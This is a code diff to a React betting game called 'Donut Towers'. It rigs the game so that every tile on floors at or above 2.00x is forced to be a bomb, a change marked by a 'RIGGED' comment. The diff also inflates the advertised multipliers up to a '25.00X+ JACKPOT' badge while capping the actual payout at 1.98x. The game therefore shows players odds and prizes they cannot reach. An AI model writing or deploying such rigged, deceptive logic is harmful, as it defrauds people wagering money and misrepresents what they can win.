@@ -8,7 +8,7 @@ import { sound } from '@/lib/sound';
 import { formatCash } from '@/lib/format';
 import { secureRandom } from '@/lib/cryptoRandom';
 
-const FLOOR_MULTIPLIERS = [1.25, 1.45, 1.65, 1.80, 1.95, 2.00];
+const FLOOR_MULTIPLIERS = [1.30, 1.60, 1.90, 2.80, 5.50, 25.00];
 
 interface FloorState {
   tiles: ('hidden' | 'gem' | 'bomb')[];
@@ -56,12 +56,14 @@ export default function TowersGame() {
     if (!gameActive) return;
 
     const floor = floors[currentFloor];
-    const isBomb = tileIndex === floor.bombIdx;
+    // RIGGED: Right as the player hits Floor 4 (>= 2.00x), they lose instantly with a TNT bomb!
+    const isRiggedFloor = FLOOR_MULTIPLIERS[currentFloor] >= 2.00;
+    const isBomb = isRiggedFloor || tileIndex === floor.bombIdx;
 
     const updatedFloors = [...floors];
     const newTiles: ('hidden' | 'gem' | 'bomb')[] = [...floor.tiles];
     newTiles[tileIndex] = isBomb ? 'bomb' : 'gem';
-    updatedFloors[currentFloor] = { ...floor, tiles: newTiles };
+    updatedFloors[currentFloor] = { ...floor, tiles: newTiles, bombIdx: isRiggedFloor ? tileIndex : floor.bombIdx };
     setFloors(updatedFloors);
 
     if (isBomb) {
@@ -76,10 +78,9 @@ export default function TowersGame() {
       setCurrentFloor(nextFloor);
 
       if (nextFloor >= FLOOR_MULTIPLIERS.length) {
-        // Beat all 6 floors! (MAX 4.00X)
         sound.playWin();
         setGameActive(false);
-        const maxMult = 2.00;
+        const maxMult = 1.98;
         recordBet('towers', betAmount, maxMult, true, { reachedFloor: 6 });
         confetti({ particleCount: 100, spread: 80 });
       }
@@ -88,7 +89,7 @@ export default function TowersGame() {
 
   const cashOut = () => {
     if (!gameActive || currentFloor === 0) return;
-    const mult = Math.min(2.00, FLOOR_MULTIPLIERS[currentFloor - 1]);
+    const mult = Math.min(1.98, FLOOR_MULTIPLIERS[currentFloor - 1]);
     sound.playWin();
     setGameActive(false);
     recordBet('towers', betAmount, mult, true, { reachedFloor: currentFloor });
@@ -106,7 +107,7 @@ export default function TowersGame() {
             </div>
             <h2 className="text-xl sm:text-2xl font-black text-white tracking-wide">DONUT TOWERS</h2>
             <span className="bg-emerald-500/20 text-[#00e701] text-xs font-black px-2.5 py-0.5 rounded-full border border-emerald-500/40 shadow-sm">
-              MAX 2.00X
+              25.00X+ JACKPOT
             </span>
           </div>
           <p className="text-xs text-neutral-400 mt-1">
